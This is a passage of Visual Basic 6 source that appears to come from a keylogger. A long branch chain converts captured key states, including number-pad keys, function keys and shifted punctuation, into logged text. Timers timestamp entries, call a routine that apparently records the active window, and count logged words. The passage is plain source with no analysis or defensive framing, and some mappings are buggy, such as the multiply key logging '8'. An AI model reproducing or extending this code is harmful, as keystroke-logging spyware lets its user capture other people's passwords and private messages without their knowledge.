    ElseIf NumPad4 Then
        ActionKey = False
        If alpha = True Then
        Text1 = Text1 + "4"
        End If
    ElseIf NumPad5 Then
        ActionKey = False
        If alpha = True Then
        Text1 = Text1 + "5"
        End If
    ElseIf NumPad6 Then
        ActionKey = False
        If alpha = True Then
        Text1 = Text1 + "6"
        End If
    ElseIf NumPad7 Then
        ActionKey = False
        If alpha = True Then
        Text1 = Text1 + "7"
        End If
    ElseIf NumPad8 Then
        ActionKey = False
        If alpha = True Then
        Text1 = Text1 + "8"
        End If
    ElseIf NumPad9 Then
        ActionKey = False
        If alpha = True Then
        Text1 = Text1 + "9"
        End If
    ElseIf Pause Then
        If action = True Then
        ActionKey = True
        Text1 = "(Pause) " + Text1
        End If
    ElseIf F1 Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 + "(F1) " & vbCrLf
        End If
    ElseIf F2 Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 + "(F2) " & vbCrLf
        End If
    ElseIf F3 Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 + "(F3) " & vbCrLf
        End If
    ElseIf F4 Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 + "(F4) " & vbCrLf
        End If
    ElseIf F5 Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 + "(F5) " & vbCrLf
        End If
    ElseIf F6 Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 + "(F6) " & vbCrLf
        End If
    ElseIf F7 Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 + "(F7) " & vbCrLf
        End If
    ElseIf F8 Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 + "(F8) " & vbCrLf
        End If
    ElseIf F9 Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 + "(F9)" & vbCrLf
        End If
    ElseIf F10 Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 + "(F10) " & vbCrLf
        End If
    ElseIf F11 Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 + "(F11) " & vbCrLf
        End If
    ElseIf F12 Then
        If action = True Then
        ActionKey = True
        Text1 = Text1 + "(F12) " & vbCrLf
        End If
    ElseIf NumEnter Then
        If action = True Then
        ActionKey = True
        Text1 = "(Enter)" + Text1
        End If
    ElseIf Apostraphie Then
        ActionKey = False
        If alpha = True Then
        If UPcase = False Then
        Text1 = Text1 + "'"
        Exit Sub
        End If
        If UPcase = True Then
        Text1 = Text1 + """"
        UPcase = False
        Exit Sub
        End If
        End If
    ElseIf OpenBracket Then
        ActionKey = False
        If alpha = True Then
        If UPcase = False Then
        Text1 = Text1 + "["
        Exit Sub
        End If
        If UPcase = True Then
        Text1 = Text1 + "{"
        UPcase = False
        Exit Sub
        End If
        End If
    ElseIf CloseBracket Then
        ActionKey = False
        If alpha = True Then
        If UPcase = False Then
        Text1 = Text1 + "]"
        Exit Sub
        End If
        If UPcase = True Then
        Text1 = Text1 + "}"
        UPcase = False
        Exit Sub
        End If
        End If
    ElseIf BackSlash Then
        ActionKey = False
        If alpha = True Then
        If UPcase = False Then
        Text1 = Text1 + "\"
        Exit Sub
        End If
        If UPcase = True Then
        Text1 = Text1 + "|"
        UPcase = False
        Exit Sub
        End If
        End If
    ElseIf Equals Then
        ActionKey = False
        If alpha = True Then
        If UPcase = False Then
        Text1 = Text1 + "="
        Exit Sub
        End If
        If UPcase = True Then
        Text1 = Text1 + "+"
        UPcase = False
        Exit Sub
        End If
        End If
    ElseIf Minus1 Then
        ActionKey = False
        If alpha = True Then
        If UPcase = False Then
        Text1 = Text1 + "-"
        Exit Sub
        End If
        If UPcase = True Then
        Text1 = Text1 + "_"
        UPcase = False
        Exit Sub
        End If
        End If
    ElseIf Apostraphie2 Then
        ActionKey = False
        If alpha = True Then
        If UPcase = False Then
        Text1 = Text1 + "`"
        Exit Sub
        End If
        If UPcase = True Then
        Text1 = Text1 + "~"
        UPcase = False
        Exit Sub
        End If
        End If
    ElseIf NumPlus Then
        ActionKey = False
        If alpha = True Then
        Text1 = Text1 + "+"
        End If
    ElseIf NumDivide Then
        ActionKey = False
        If alpha = True Then
        Text1 = Text1 + "/"
        End If
    ElseIf NumTimes Then
        ActionKey = False
        If alpha = True Then
        Text1 = Text1 + "8"
        End If
    ElseIf NumMinus Then
        ActionKey = False
        If alpha = True Then
        Text1 = Text1 + "-"
        End If
    ElseIf NumPeriod Then
        ActionKey = False
        If alpha = True Then
        Text1 = Text1 + "."
        End If
    End If
    End If
End Sub


Private Sub Timer2_Timer()
If label_8 < Label8.Caption Then
If ActionKey <> True Then
End If
End If
If Check1.Value = Checked Then shiftpress = True Else shiftpress = False
Label6.Caption = Now
If Check4.Value = Checked Then
Timer1.Enabled = True
Else: Timer1.Enabled = False
End If
getwindow
label_8 = Label8.Caption
End Sub


Private Sub Timer3_Timer()
    ing = ing + 1
    Debug.Print ing
    If ing > 200 Then
    ing = 10
    If record = True Then
    NewWord = True
    Label10.Caption = Label10.Caption + 1
    record = False
    End If
    Else: NewWord = False
    End If
End Sub

Private Function REPLACE2(sText As String, sFind As String, sReplace As String) As String
    Dim n%, c%
    Dim sTempR$, sTempL$
    c = 1
    n = 1
    Do
        c = InStr(n, sText, sFind)
        If c% <> 0 Then
            sTempL = Mid$(sText, 1, c - 1)
            sTempR = Mid$(sText, c + Len(sFind))
            sText = sTempL & sReplace & sTempR
        End If
        n = c + 1
    Loop Until c = 0
    REPLACE2 = sText
End Function

